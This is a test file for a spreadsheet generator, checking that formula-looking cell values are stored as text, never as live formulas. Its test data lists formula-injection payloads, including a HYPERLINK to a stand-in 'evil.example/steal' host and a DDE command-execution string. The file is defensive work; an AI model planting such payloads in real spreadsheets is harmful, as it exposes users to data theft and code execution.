import ExcelJS from 'exceljs';
import { generateDocument } from './generate';

/** The model's content is influenced by whatever documents it has read, so a cell
 *  value is untrusted input. Excel only evaluates cells typed as formulas, and
 *  exceljs writes plain strings as shared strings — assert that, rather than
 *  trusting it, since a regression would turn a spreadsheet into an attack. */
describe('xlsx cell safety', () => {
  const dangerous = [
    '=1+1',
    '=HYPERLINK("http://evil.example/steal","click")',
    '+1+1',
    '-1+1',
    '@SUM(A1)',
    "=cmd|'/c calc'!A0",
  ];

  it('stores formula-looking strings as text, never as formulas', async () => {
    const doc = await generateDocument({
      format: 'xlsx',
      filename: 'safety',
      sheets: [{ name: 'Data', rows: [['Value'], ...dangerous.map((value) => [value])] }],
    });

    const workbook = new ExcelJS.Workbook();
    await workbook.xlsx.load(doc.buffer as unknown as ArrayBuffer);
    const sheet = workbook.getWorksheet('Data');

    dangerous.forEach((value, index) => {
      const cell = sheet!.getCell(index + 2, 1);
      expect(cell.type).toBe(ExcelJS.ValueType.String);
      expect(cell.formula).toBeUndefined();
      expect(cell.value).toBe(value);
    });
  });

  it('keeps real numbers and booleans typed', async () => {
    const doc = await generateDocument({
      format: 'xlsx',
      filename: 'types',
      sheets: [
        {
          name: 'Data',
          rows: [
            ['n', 'b'],
            [42, true],
          ],
        },
      ],
    });

    const workbook = new ExcelJS.Workbook();
    await workbook.xlsx.load(doc.buffer as unknown as ArrayBuffer);
    const sheet = workbook.getWorksheet('Data');

    expect(sheet!.getCell(2, 1).value).toBe(42);
    expect(sheet!.getCell(2, 2).value).toBe(true);
  });
});
